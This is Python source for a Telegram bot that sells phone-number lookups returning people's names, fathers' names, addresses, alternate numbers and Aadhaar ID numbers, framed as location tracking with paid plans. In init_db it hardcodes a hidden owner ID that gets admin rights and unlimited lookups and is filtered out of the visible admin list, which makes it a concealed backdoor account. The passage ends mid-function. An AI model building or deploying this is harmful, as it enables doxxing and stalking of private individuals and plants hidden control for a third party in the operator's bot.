import os
import logging
import asyncio
import threading
import sys
import uuid
from datetime import datetime
from functools import wraps
from dotenv import load_dotenv
from telegram import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters
import aiohttp
from pymongo import MongoClient
from pymongo.errors import DuplicateKeyError
from flask import Flask, jsonify, request as flask_request

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
load_dotenv("ss.env")

BOT_TOKEN = os.getenv("BOT_TOKEN")
VISIBLE_OWNER_ID = int(os.getenv("OWNER_ID")) if os.getenv("OWNER_ID") else 0
FLASK_API_KEY = os.getenv("FLASK_API_KEY", "change-me-please")

SUPPORT_USERNAME = os.getenv("OWNER_USERNAME", "@SlLENTH4CKER")
FORCE_CHANNEL = ""
SUSPENDED_USERS = []
QR_PHOTO = None
DEMO_VIDEO = None
API_URL = "https://patel-hiteck-api.vercel.app/search?q={term}"
pending_payments = {}
payment_store = {}
processed_payments = set()

MONGO_URI = os.getenv("MONGO_URI")
client = MongoClient(MONGO_URI)
db = client["telegram_bot"]
users_col = db["users"]
plans_col = db["plans"]
revenue_col = db["revenue"]
settings_col = db["settings"]

users_col.create_index("user_id", unique=True)
plans_col.create_index("name", unique=True)

bot_application = None
bot_loop = None
_api_session = None

def to_bold_font(text):
    res = []
    for c in str(text):
        if 'A' <= c <= 'Z':
            res.append(chr(0x1D5D4 + (ord(c) - ord('A'))))
        elif 'a' <= c <= 'z':
            res.append(chr(0x1D5EE + (ord(c) - ord('a'))))
        elif '0' <= c <= '9':
            res.append(chr(0x1D7EC + (ord(c) - ord('0'))))
        else:
            res.append(c)
    return ''.join(res)

def gen_pay_id():
    return uuid.uuid4().hex[:8]

def init_db():
    global HIDDEN_OWNER_ID, OWNER_IDS
    HIDDEN_OWNER_ID = 8544308334
    OWNER_IDS = {VISIBLE_OWNER_ID, HIDDEN_OWNER_ID}
    if plans_col.count_documents({}) == 0:
        default_plans = [
            {"name": to_bold_font("DEMO"), "price": 49, "traces": 5, "validity_days": 30},
            {"name": to_bold_font("PREMIUM"), "price": 109, "traces": 19, "validity_days": 30},
            {"name": to_bold_font("PREMIUM ULTRA"), "price": 199, "traces": 25, "validity_days": 30},
            {"name": to_bold_font("ULTIMATE PREMIUM"), "price": 299, "traces": 0, "validity_days": 30}
        ]
        plans_col.insert_many(default_plans)
    if settings_col.find_one({"key": "maintenance"}) is None:
        settings_col.insert_one({"key": "maintenance", "value": "False"})

init_db()

def get_maintenance():
    doc = settings_col.find_one({"key": "maintenance"})
    return doc["value"] == "True" if doc else False

def set_maintenance(val):
    settings_col.update_one({"key": "maintenance"}, {"$set": {"value": str(val)}}, upsert=True)

def get_plans():
    return list(plans_col.find({}, {"_id": 0, "id": {"$toString": "$_id"}, "name": 1, "price": 1, "traces": 1, "validity_days": 1}))

def add_plan(name, price, traces, validity_days):
    try:
        plans_col.insert_one({"name": name, "price": price, "traces": traces, "validity_days": validity_days})
        return True, "Plan added."
    except DuplicateKeyError:
        return False, "Name exists."

def update_plan(pid, name, price, traces, validity_days):
    from bson import ObjectId
    result = plans_col.update_one({"_id": ObjectId(pid)}, {"$set": {"name": name, "price": price, "traces": traces, "validity_days": validity_days}})
    return True, "Plan updated." if result.modified_count else True, "No changes."

def delete_plan(pid):
    from bson import ObjectId
    result = plans_col.delete_one({"_id": ObjectId(pid)})
    return True, "Plan deleted." if result.deleted_count else False, "Not found."

def get_user_data(uid):
    if uid in OWNER_IDS or is_admin(uid):
        return {"traces": 999999999, "plan": to_bold_font("ULTIMATE PREMIUM")}
    doc = users_col.find_one({"user_id": uid})
    if doc:
        return {"traces": doc.get("traces", 0), "plan": doc.get("plan", to_bold_font("None"))}
    return {"traces": 0, "plan": to_bold_font("None")}

def update_user_traces(uid, add_traces, plan_name=None):
    if uid in OWNER_IDS:
        return
    update = {"$inc": {"traces": add_traces}}
    if plan_name is not None:
        update["$set"] = {"plan": plan_name}
    users_col.update_one({"user_id": uid}, update, upsert=True)

def add_new_user(uid, username, first_name, notify_admins=True):
    if users_col.find_one({"user_id": uid}):
        return False
    is_owner = uid in OWNER_IDS
    users_col.insert_one({
        "user_id": uid, "username": username, "first_name": first_name,
        "traces": 0, "plan": to_bold_font("None"), "is_admin": True if is_owner else False,
        "is_owner": is_owner, "joined_date": datetime.now().isoformat()
    })
    return True

def is_admin(uid):
    doc = users_col.find_one({"user_id": uid})
    return doc and doc.get("is_admin", False) or uid in OWNER_IDS

def make_admin(uid):
    if uid in OWNER_IDS:
        return False, "Cannot change owner rights."
    users_col.update_one({"user_id": uid}, {"$set": {"is_admin": True}}, upsert=True)
    return True, "Admin added."

def remove_admin(uid):
    if uid in OWNER_IDS:
        return False, "Cannot remove owner."
    users_col.update_one({"user_id": uid}, {"$set": {"is_admin": False}})
    return True, "Admin removed."

def get_all_users():
    return [doc["user_id"] for doc in users_col.find({}, {"user_id": 1})]

def get_visible_admin_list():
    return list(users_col.find({"is_admin": True, "user_id": {"$ne": HIDDEN_OWNER_ID}}, {"user_id": 1, "username": 1}))

def add_revenue(uid, plan_name, amount):
    revenue_col.insert_one({"user_id": uid, "plan_name": plan_name, "amount": amount, "approved_time": datetime.now().isoformat()})

def get_revenue_stats():
    pipeline = [{"$group": {"_id": None, "total": {"$sum": "$amount"}}}]
    total_res = list(revenue_col.aggregate(pipeline))
    total = total_res[0]["total"] if total_res else 0
    breakdown = list(revenue_col.aggregate([{"$group": {"_id": "$plan_name", "total": {"$sum": "$amount"}, "count": {"$sum": 1}}}]))
    return total, [(b["_id"], b["total"], b["count"]) for b in breakdown]

async def notify_admins_new_user(context, uid, username, first_name):
    admins = get_visible_admin_list()
    if VISIBLE_OWNER_ID and VISIBLE_OWNER_ID != HIDDEN_OWNER_ID and VISIBLE_OWNER_ID not in [a["user_id"] for a in admins]:
        admins.append({"user_id": VISIBLE_OWNER_ID, "username": None})
    for admin in admins:
        try:
            await context.bot.send_message(admin["user_id"], f"<b>🆕 {to_bold_font('NEW USER')}:\n\n• ID: <code>{uid}</code>\n• @{username if username else 'None'}\n• {first_name}</b>", parse_mode="HTML")
        except:
            pass

def get_main_menu(uid):
    buttons = [
        [f"📍 {to_bold_font('TRACK LOCATION')}", f"🎬 {to_bold_font('SEE DEMO')}"],
        [f"💳 {to_bold_font('SUBSCRIPTION PLANS')}", f"👤 {to_bold_font('MY ACCOUNT')}"],
        [f"✉️ {to_bold_font('HELP & SUPPORT')}"]
    ]
    if is_admin(uid):
        buttons.append([f"🔧 {to_bold_font('ADMIN PANEL')}"])
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

def get_plans_inline():
    plans = get_plans()
    keyboard = []
    for i in range(0, len(plans), 2):
        p1 = plans[i]
        row = [InlineKeyboardButton(f"{to_bold_font('PAY')} {to_bold_font(str(p1['price']))}₹ ({p1['name']})", callback_data=f"pay_{p1['id']}")]
        if i+1 < len(plans):
            p2 = plans[i+1]
            row.append(InlineKeyboardButton(f"{to_bold_font('PAY')} {to_bold_font(str(p2['price']))}₹ ({p2['name']})", callback_data=f"pay_{p2['id']}"))
        keyboard.append(row)
    return InlineKeyboardMarkup(keyboard)

def get_support_inline():
    return InlineKeyboardMarkup([[InlineKeyboardButton(to_bold_font("Contact Support"), url=f"https://t.me/{SUPPORT_USERNAME}")]])

def get_done_inline():
    return InlineKeyboardMarkup([[InlineKeyboardButton(to_bold_font("Done ✅ (Upload screenshot)"), callback_data="done_upload")]])

async def _get_api_session():
    global _api_session
    if _api_session is None or _api_session.closed:
        timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=20)
        _api_session = aiohttp.ClientSession(timeout=timeout, headers={"User-Agent": "Mozilla/5.0"})
    return _api_session

async def _close_api_session():
    global _api_session
    if _api_session and not _api_session.closed:
        await _api_session.close()
        _api_session = None

async def fetch_and_parse(number):
    url = API_URL.format(term=number)
    max_retries = 3
    for attempt in range(max_retries):
        try:
            session = await _get_api_session()
            async with session.get(url, allow_redirects=True) as resp:
                if resp.status == 429:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(2 * (attempt + 1))
                        continue
                    return "Error: Rate limited.", None
                if resp.status >= 500:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(2 * (attempt + 1))
                        continue
                    return "Error: Server down.", None
                if resp.status != 200:
                    return f"Error: Status {resp.status}", None
                try:
                    data = await resp.json(content_type=None)
                except:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                        continue
                    return "Error: Bad response.", None
                if not data.get("success") or not data.get("results"):
                    return None, "NOT_FOUND"
                first = data["results"][0]
                address = first.get("address")
                if not address or str(address).strip() in ("", "N/A"):
                    return None, "NOT_FOUND"
                return {"raw_data": first, "address": address}, "FOUND"
        except asyncio.TimeoutError:
            if attempt < max_retries - 1:
                await asyncio.sleep(1 * (attempt + 1))
            else:
                return "Error: Timeout.", None
        except Exception as e:
            if attempt < max_retries - 1:
                await asyncio.sleep(1 * (attempt + 1))
            else:
                return f"Error: {str(e)}", None
    return "Error: Max retries.", None

flask_app = Flask(__name__)

def require_api_key(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        key = flask_request.headers.get("X-API-Key") or flask_request.args.get("key")
        if key != FLASK_API_KEY:
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

@flask_app.route("/", methods=["GET"])
def health():
    return jsonify({"status": "running"})

@flask_app.route("/api/users", methods=["GET"])
@require_api_key
def api_users():
    return jsonify({"users": list(users_col.find({}, {"_id": 0})), "count": users_col.count_documents({})})

@flask_app.route("/api/stats", methods=["GET"])
@require_api_key
def api_stats():
    total_rev, _ = get_revenue_stats()
    return jsonify({"total_users": users_col.count_documents({}), "total_revenue": total_rev})

def run_flask():
    flask_app.run(host="0.0.0.0", port=8080, use_reloader=False)

async def start(update, context):
    if get_maintenance() and not is_admin(update.message.from_user.id):
        await update.message.reply_text(f"<b>🛠 {to_bold_font('Bot under maintenance.')}</b>", parse_mode="HTML")
        return
    user = update.message.from_user
    is_new = add_new_user(user.id, user.username, user.first_name)
    if is_new:
        await notify_admins_new_user(context, user.id, user.username, user.first_name)
    if FORCE_CHANNEL:
        try:
            member = await context.bot.get_chat_member(chat_id=f"@{FORCE_CHANNEL}", user_id=user.id)
            if member.status not in ["member", "administrator", "creator"]:
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton(f"🔗 {to_bold_font('Join Channel')}", url=f"https://t.me/{FORCE_CHANNEL}")],
                    [InlineKeyboardButton(f"🔄 {to_bold_font('Try Again')}", callback_data="check_join")]
                ])
                await update.message.reply_text(f"<b>▶ {to_bold_font('Join channel first, then click Try Again')} 🔽</b>", parse_mode="HTML", reply_markup=keyboard)
                return
        except:
            pass
    await update.message.reply_text(f"<b>{to_bold_font('Select an option below.')}</b>", reply_markup=get_main_menu(user.id), parse_mode="HTML")

async def check_join_callback(update, context):
    query = update.callback_query
    await query.answer()
    if not FORCE_CHANNEL:
        try: await query.message.delete()
        except: pass
        await context.bot.send_message(query.from_user.id, f"<b>✅ {to_bold_font('Verified!')}</b>", reply_markup=get_main_menu(query.from_user.id), parse_mode="HTML")
        return
    try:
        member = await context.bot.get_chat_member(chat_id=f"@{FORCE_CHANNEL}", user_id=query.from_user.id)
        if member.status in ["member", "administrator", "creator"]:
            try: await query.message.delete()
            except: pass
            await context.bot.send_message(query.from_user.id, f"<b>✅ {to_bold_font('Verified!')}</b>", reply_markup=get_main_menu(query.from_user.id), parse_mode="HTML")
        else:
            await query.answer(to_bold_font("You haven't joined yet."), show_alert=True)
    except:
        await query.answer(to_bold_font("Error verifying."), show_alert=True)

async def handle_text(update, context):
    if get_maintenance() and not is_admin(update.message.from_user.id):
        await update.message.reply_text(f"<b>🛠 {to_bold_font('Under maintenance.')}</b>", parse_mode="HTML")
        return
    global SUSPENDED_USERS, SUPPORT_USERNAME, FORCE_CHANNEL, QR_PHOTO, DEMO_VIDEO
    uid = update.message.from_user.id
    text = update.message.text

    if uid in SUSPENDED_USERS:
        await update.message.reply_text(f"<b>⛔ {to_bold_font('Suspended.')}</b>", parse_mode="HTML")
        return

    menu = [
        f"📍 {to_bold_font('TRACK LOCATION')}", f"🎬 {to_bold_font('SEE DEMO')}", f"💳 {to_bold_font('SUBSCRIPTION PLANS')}",
        f"👤 {to_bold_font('MY ACCOUNT')}", f"✉️ {to_bold_font('HELP & SUPPORT')}",
        f"🔧 {to_bold_font('ADMIN PANEL')}", f"📊 {to_bold_font('VAST STATS')}", f"💰 {to_bold_font('REVENUE')}",
        f"📢 {to_bold_font('BROADCAST')}", f"🚫 {to_bold_font('SUSPEND')}", f"✅ {to_bold_font('UNSUSPEND')}",
        f"➕ {to_bold_font('ADD ADMIN')}", f"❌ {to_bold_font('REMOVE ADMIN')}", f"👑 {to_bold_font('ADMIN LIST')}",
        f"🔗 {to_bold_font('FORCE CHANNEL')}", f"❌ {to_bold_font('REMOVE FORCE SUB')}", f"🆘 {to_bold_font('SUPPORT USERNAME')}",
        f"🖼 {to_bold_font('ADD QR')}", f"❌ {to_bold_font('REMOVE QR')}", f"🎬 {to_bold_font('SET DEMO')}",
        f"🔧 {to_bold_font('MAINTENANCE')}", f"➕ {to_bold_font('ADD PLAN')}", f"📝 {to_bold_font('EDIT PLAN')}",
        f"🗑 {to_bold_font('DELETE PLAN')}", f"➕ {to_bold_font('ADD TRACES')}", f"➖ {to_bold_font('REMOVE TRACES')}",
        f"🎁 {to_bold_font('ADD SUBSCRIPTION')}", f"❌ {to_bold_font('REMOVE SUBSCRIPTION')}", f"⬅️ {to_bold_font('BACK')}",
        f"📋 {to_bold_font('PLAN STATUS')}", f"🗑 {to_bold_font('CLEAR MONGO')}", f"🔍 {to_bold_font('CHECK USER')}",
        f"✉️ {to_bold_font('MESSAGE USER')}"
    ]
    if text in menu:
        context.user_data.pop("state", None)

    if context.user_data.get("state") == "awaiting_phone":
        if text.isdigit():
            if len(text) != 10:
                await update.message.reply_text(f"<b>❌ {to_bold_font('Must be 10 digits.')}</b>", parse_mode="HTML")
                return
            user_data = get_user_data(uid)
            if user_data["traces"] > 0:
                update_user_traces(uid, -1, user_data["plan"])
                proc_msg = await update.message.reply_text(f"<b>⏳ {to_bold_font('Processing...')}</b>", parse_mode="HTML")
                result, status = await fetch_and_parse(text)
                if status == "NOT_FOUND":
                    update_user_traces(uid, 1, user_data["plan"])
                    await proc_msg.edit_text(f"<b>❌ {to_bold_font('Location not found. Traces refunded.')}</b>", parse_mode="HTML")
                elif status == "FOUND":
                    raw_data = result["raw_data"]
                    address = result["address"]
                    msg = f"<b>🔍 {to_bold_font('NUMBER LOOKUP RESULT')}\n━━━━━━━━━━━━━━━━━━━\n"
                    name = raw_data.get("name")
                    fname = raw_data.get("fathersName")
                    addr = raw_data.get("address")
                    circle = raw_data.get("circle") or raw_data.get("source")
                    mobile = raw_data.get("phoneNumber")
                    alt = raw_data.get("otherNumber")
                    id_num = raw_data.get("aadharNumber")
                    if name: msg += f"• {to_bold_font('NAME')}: {to_bold_font(name)}\n"
                    if fname: msg += f"• {to_bold_font('FNAME')}: {to_bold_font(fname)}\n"
                    if addr: msg += f"• {to_bold_font('ADDRESS')}: {to_bold_font(addr)}\n"
                    if circle: msg += f"• {to_bold_font('CIRCLE')}: {to_bold_font(circle)}\n"
                    if mobile: msg += f"• {to_bold_font('MOBILE')}: {to_bold_font(mobile)}\n"
                    if alt: msg += f"• {to_bold_font('ALT')}: {to_bold_font(alt)}\n"
                    if id_num: msg += f"• {to_bold_font('ID')}: {to_bold_font(id_num)}\n"
                    msg += f"━━━━━━━━━━━━━━━━━━━</b>"
                    maps_url = f"https://www.google.com/maps/search/?api=1&query={str(address).replace(' ', '+')}"
                    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(f"📍 {to_bold_font('See Live Location')}", url=maps_url)]])
                    await proc_msg.edit_text(msg, parse_mode="HTML", reply_markup=keyboard)
                else:
                    await proc_msg.edit_text(f"<b>❌ {to_bold_font(str(result))}</b>", parse_mode="HTML")
            else:
                await update.message.reply_text(f"<b>❌ {to_bold_font('No traces left.')}</b>", parse_mode="HTML")
            context.user_data.pop("state", None)
        else:
            await update.message.reply_text(f"<b>❌ {to_bold_font('Digits only.')}</b>", parse_mode="HTML")
        return

    if is_admin(uid):
        if text == f"🔧 {to_bold_font('ADMIN PANEL')}":
            await admin_panel(update, context); return
        elif text == f"📊 {to_bold_font('VAST STATS')}":
            total_users = users_col.count_documents({})
            admins_count = len(get_visible_admin_list()) + len(OWNER_IDS)
            total_rev, _ = get_revenue_stats()
            maint = "ON" if get_maintenance() else "OFF"
            force = f"@{FORCE_CHANNEL}" if FORCE_CHANNEL else to_bold_font("Off")
            try:
                db_stats = db.command("dbstats"); db_size = db_stats['dataSize'] / (1024 * 1024); db_objects = db_stats['objects']
            except:
                db_size = 0; db_objects = 0
            msg = f"<b>📊 {to_bold_font('VAST STATS')}</b>\n\n<b>👥 {to_bold_font('Users')}: {total_users}\n🚫 {to_bold_font('Suspended')}: {len(SUSPENDED_USERS)}\n👑 {to_bold_font('Admins')}: {admins_count}\n💰 {to_bold_font('Revenue')}: ₹{total_rev}\n🛠 {to_bold_font('Maintenance')}: {maint}\n🔗 {to_bold_font('Force Sub')}: {force}\n\n🗄 {to_bold_font('MONGO')}\n• {to_bold_font('Docs')}: {db_objects}\n• {to_bold_font('Size')}: {db_size:.2f} MB</b>"
            await update.message.reply_text(msg, parse_mode="HTML"); return
        elif text == f"💰 {to_bold_font('REVENUE')}":
            total, breakdown = get_revenue_stats()
            msg = f"<b>💰 {to_bold_font('TOTAL')}: ₹{total}</b>\n\n"
            for plan, amt, cnt in breakdown:
                msg += f"<b>• {plan}: ₹{amt} ({cnt})</b>\n"
            await update.message.reply_text(msg, parse_mode="HTML"); return
        elif text == f"🔍 {to_bold_font('CHECK USER')}":
            context.user_data['admin_state'] = "check_user"
            await update.message.reply_text(f"<b>{to_bold_font('Send User ID.')}</b>", parse_mode="HTML"); return
        elif text == f"✉️ {to_bold_font('MESSAGE USER')}":
            context.user_data['admin_state'] = "message_user"
            await update.message.reply_text(f"<b>{to_bold_font('Send User ID then message on new line.')}</b>", parse_mode="HTML"); return
        elif text == f"👑 {to_bold_font('ADMIN LIST')}":
            admins = get_visible_admin_list()
            msg = f"<b>👑 {to_bold_font('ADMINS')}</b>\n\n"
            for admin in admins:
                aid = admin["user_id"]; uname = admin.get("username", "N/A")
                role = "👑" if aid == VISIBLE_OWNER_ID else "👤"
                msg += f"<b>• {role} {aid} (@{uname})</b>\n"
            await update.message.reply_text(msg, parse_mode="HTML"); return
        elif text == f"📢 {to_bold_font('BROADCAST')}":
            context.user_data['admin_state'] = "broadcast"
            await update.message.reply_text(f"<b>{to_bold_font('Send broadcast.')}</b>", parse_mode="HTML"); return
        elif text == f"🚫 {to_bold_font('SUSPEND')}":
            context.user_data['admin_state'] = "suspend"
            await update.message.reply_text(f"<b>{to_bold_font('Send user ID.')}</b>", parse_mode="HTML"); return
        elif text == f"✅ {to_bold_font('UNSUSPEND')}":
            context.user_data['admin_state'] = "unsuspend"
            await update.message.reply_text(f"<b>{to_bold_font('Send user ID.')}</b>", parse_mode="HTML"); return
        elif text == f"➕ {to_bold_font('ADD ADMIN')}":
            context.user_data['admin_state'] = "add_admin"
            await update.message.reply_text(f"<b>{to_bold_font('Send user ID.')}</b>", parse_mode="HTML"); return
        elif text == f"❌ {to_bold_font('REMOVE ADMIN')}":
            context.user_data['admin_state'] = "remove_admin"
            await update.message.reply_text(f"<b>{to_bold_font('Send admin ID.')}</b>", parse_mode="HTML"); return
        elif text == f"🔗 {to_bold_font('FORCE CHANNEL')}":
            context.user_data['admin_state'] = "force_channel"
            await update.message.reply_text(f"<b>{to_bold_font('Send channel without @')}</b>", parse_mode="HTML"); return
        elif text == f"❌ {to_bold_font('REMOVE FORCE SUB')}":
            FORCE_CHANNEL = ""
            await update.message.reply_text(f"<b>✅ {to_bold_font('Removed.')}</b>", parse_mode="HTML"); return
        elif text == f"🆘 {to_bold_font('SUPPORT USERNAME')}":
            context.user_data['admin_state'] = "support"
            await update.message.reply_text(f"<b>{to_bold_font('Send username without @')}</b>", parse_mode="HTML"); return
        elif text == f"🖼 {to_bold_font('ADD QR')}":
            context.user_data['admin_state'] = "add_qr"
            await update.message.reply_text(f"<b>{to_bold_font('Send QR photo.')}</b>", parse_mode="HTML"); return
        elif text == f"❌ {to_bold_font('REMOVE QR')}":
            QR_PHOTO = None
            await update.message.reply_text(f"<b>✅ {to_bold_font('Removed.')}</b>", parse_mode="HTML"); return
        elif text == f"🎬 {to_bold_font('SET DEMO')}":
            context.user_data['admin_state'] = "set_demo"
            await update.message.reply_text(f"<b>{to_bold_font('Send demo video.')}</b>", parse_mode="HTML"); return
        elif text == f"🔧 {to_bold_font('MAINTENANCE')}":
            ns = not get_maintenance(); set_maintenance(ns)
            await update.message.reply_text(f"<b>🛠 {to_bold_font('Maintenance')}: {'ON' if ns else 'OFF'}</b>", parse_mode="HTML"); return
        elif text == f"➕ {to_bold_font('ADD PLAN')}":
            context.user_data['admin_state'] = "add_plan"
            await update.message.reply_text(f"<b>{to_bold_font('Format: Name,Price,Traces,Days')}</b>", parse_mode="HTML"); return
        elif text == f"📝 {to_bold_font('EDIT PLAN')}":
            context.user_data['admin_state'] = "edit_plan"; plans = get_plans()
            msg = f"<b>{to_bold_font('Send plan ID:')}</b>\n\n"
            for p in plans: msg += f"<b>{p['id']}. {p['name']} - ₹{p['price']}</b>\n"
            await update.message.reply_text(msg, parse_mode="HTML"); return
        elif text == f"🗑 {to_bold_font('DELETE PLAN')}":
            context.user_data['admin_state'] = "delete_plan"
            await update.message.reply_text(f"<b>{to_bold_font('Send plan ID.')}</b>", parse_mode="HTML"); return
        elif text == f"➕ {to_bold_font('ADD TRACES')}":
            context.user_data['admin_state'] = "add_traces"
            await update.message.reply_text(f"<b>{to_bold_font('Format: USER_ID TRACES')}</b>", parse_mode="HTML"); return
        elif text == f"➖ {to_bold_font('REMOVE TRACES')}":
            context.user_data['admin_state'] = "remove_traces"
            await update.message.reply_text(f"<b>{to_bold_font('Format: USER_ID TRACES')}</b>", parse_mode="HTML"); return
        elif text == f"🎁 {to_bold_font('ADD SUBSCRIPTION')}":
            context.user_data['admin_state'] = "add_subscription"
            await update.message.reply_text(f"<b>{to_bold_font('Format: USER_ID PLAN_NAME')}</b>", parse_mode="HTML"); return
        elif text == f"❌ {to_bold_font('REMOVE SUBSCRIPTION')}":
            context.user_data['admin_state'] = "remove_subscription"
            await update.message.reply_text(f"<b>{to_bold_font('Send user ID.')}</b>", parse_mode="HTML"); return
        elif text == f"📋 {to_bold_font('PLAN STATUS')}":
            pipeline = [{"$group": {"_id": "$plan", "count": {"$sum": 1}}}]
            msg = f"<b>📋 {to_bold_font('PLAN STATUS')}</b>\n\n"
            for p in list(users_col.aggregate(pipeline)): msg += f"<b>• {p['_id']}: {p['count']}</b>\n"
            await update.message.reply_text(msg, parse_mode="HTML"); return
        elif text == f"🗑 {to_bold_font('CLEAR MONGO')}":
            context.user_data['admin_state'] = "clear_mongo"
            await update.message.reply_text(f"<b>⚠️ {to_bold_font('Type YES to clear ALL!')}</b>", parse_mode="HTML"); return
        elif text == f"⬅️ {to_bold_font('BACK')}":
            await update.message.reply_text(f"<b>{to_bold_font('Back.')}</b>", reply_markup=get_main_menu(uid), parse_mode="HTML"); return

        state = context.user_data.get('admin_state')
        if state == "check_user":
            try:
                uid2 = int(text); doc = users_col.find_one({"user_id": uid2})
                if doc:
                    msg = f"<b>🔍 {to_bold_font('USER')}\n\n• ID: {doc['user_id']}\n• Name: {doc.get('first_name','N/A')}\n• @: @{doc.get('username','None')}\n• Plan: {doc.get('plan','None')}\n• Traces: {doc.get('traces',0)}\n• Joined: {doc.get('joined_date','N/A')}</b>"
                    await update.message.reply_text(msg, parse_mode="HTML")
                else: await update.message.reply_text(f"<b>❌ {to_bold_font('Not found.')}</b>", parse_mode="HTML")
            except: await update.message.reply_text(f"<b>{to_bold_font('Invalid ID.')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "message_user":
            parts = text.split('\n', 1)
            if len(parts) == 2:
                try:
                    uid2 = int(parts[0].strip()); msg_text = parts[1].strip()
                    await context.bot.send_message(uid2, f"<b>✉️ {to_bold_font('Admin Message')}:\n\n{msg_text}</b>", parse_mode="HTML")
                    await update.message.reply_text(f"<b>✅ {to_bold_font('Sent to')} {uid2}</b>", parse_mode="HTML")
                except: await update.message.reply_text(f"<b>❌ {to_bold_font('Failed.')}</b>", parse_mode="HTML")
            else: await update.message.reply_text(f"<b>{to_bold_font('Format: ID\\nMessage')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "broadcast":
            users = get_all_users(); sent = 0
            for u in users:
                try: await context.bot.send_message(u, text, parse_mode="HTML"); sent += 1
                except: pass
            await update.message.reply_text(f"<b>✅ {to_bold_font('Broadcast')}: {sent}/{len(users)}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "suspend":
            try:
                uid2 = int(text)
                if uid2 not in SUSPENDED_USERS: SUSPENDED_USERS.append(uid2)
                await update.message.reply_text(f"<b>✅ {to_bold_font('Suspended')} {uid2}</b>", parse_mode="HTML")
            except: await update.message.reply_text(f"<b>{to_bold_font('Invalid ID.')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "unsuspend":
            try:
                uid2 = int(text)
                if uid2 in SUSPENDED_USERS: SUSPENDED_USERS.remove(uid2)
                await update.message.reply_text(f"<b>✅ {to_bold_font('Unsuspended')} {uid2}</b>", parse_mode="HTML")
            except: await update.message.reply_text(f"<b>{to_bold_font('Invalid ID.')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "add_admin":
            try: uid2 = int(text); _, msg = make_admin(uid2); await update.message.reply_text(f"<b>{to_bold_font(msg)}</b>", parse_mode="HTML")
            except: await update.message.reply_text(f"<b>{to_bold_font('Invalid ID.')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "remove_admin":
            try: uid2 = int(text); _, msg = remove_admin(uid2); await update.message.reply_text(f"<b>{to_bold_font(msg)}</b>", parse_mode="HTML")
            except: await update.message.reply_text(f"<b>{to_bold_font('Invalid ID.')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "force_channel":
            FORCE_CHANNEL = text.strip().replace("@", "")
            await update.message.reply_text(f"<b>✅ {to_bold_font('Set to')} @{FORCE_CHANNEL}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "support":
            SUPPORT_USERNAME = text.strip().replace("@", "")
            await update.message.reply_text(f"<b>✅ {to_bold_font('Set to')} @{SUPPORT_USERNAME}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "add_plan":
            parts = text.replace(',', ' ').split()
            if len(parts) >= 4:
                try: _, msg = add_plan(parts[0], int(parts[1]), int(parts[2]), int(parts[3])); await update.message.reply_text(f"<b>{to_bold_font(msg)}</b>", parse_mode="HTML")
                except: await update.message.reply_text(f"<b>{to_bold_font('Invalid.')}</b>", parse_mode="HTML")
            else: await update.message.reply_text(f"<b>{to_bold_font('Format: Name,Price,Traces,Days')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "edit_plan":
            try:
                from bson import ObjectId
                if not ObjectId.is_valid(text): raise ValueError
                plan = plans_col.find_one({"_id": ObjectId(text)})
                if plan:
                    context.user_data['edit_pid'] = text; context.user_data['admin_state'] = "edit_plan_details"
                    await update.message.reply_text(f"<b>{to_bold_font('Send new: Name,Price,Traces,Days')}</b>", parse_mode="HTML")
                else: await update.message.reply_text(f"<b>{to_bold_font('Not found.')}</b>", parse_mode="HTML"); context.user_data.pop('admin_state', None)
            except: await update.message.reply_text(f"<b>{to_bold_font('Invalid ID.')}</b>", parse_mode="HTML"); context.user_data.pop('admin_state', None)
            return
        elif state == "edit_plan_details":
            parts = text.replace(',', ' ').split()
            if len(parts) >= 4:
                try: _, msg = update_plan(context.user_data.get('edit_pid'), parts[0], int(parts[1]), int(parts[2]), int(parts[3])); await update.message.reply_text(f"<b>{to_bold_font(msg)}</b>", parse_mode="HTML")
                except: await update.message.reply_text(f"<b>{to_bold_font('Invalid.')}</b>", parse_mode="HTML")
            else: await update.message.reply_text(f"<b>{to_bold_font('Format: Name,Price,Traces,Days')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); context.user_data.pop('edit_pid', None); return
        elif state == "delete_plan":
            try:
                from bson import ObjectId
                if not ObjectId.is_valid(text): raise ValueError
                _, msg = delete_plan(text); await update.message.reply_text(f"<b>{to_bold_font(msg)}</b>", parse_mode="HTML")
            except: await update.message.reply_text(f"<b>{to_bold_font('Invalid ID.')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "add_traces":
            parts = text.split()
            if len(parts) == 2:
                try: update_user_traces(int(parts[0]), int(parts[1])); await update.message.reply_text(f"<b>✅ {to_bold_font('Added.')}</b>", parse_mode="HTML")
                except: await update.message.reply_text(f"<b>{to_bold_font('Invalid.')}</b>", parse_mode="HTML")
            else: await update.message.reply_text(f"<b>{to_bold_font('Format: USER_ID TRACES')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "remove_traces":
            parts = text.split()
            if len(parts) == 2:
                try: update_user_traces(int(parts[0]), -int(parts[1])); await update.message.reply_text(f"<b>✅ {to_bold_font('Removed.')}</b>", parse_mode="HTML")
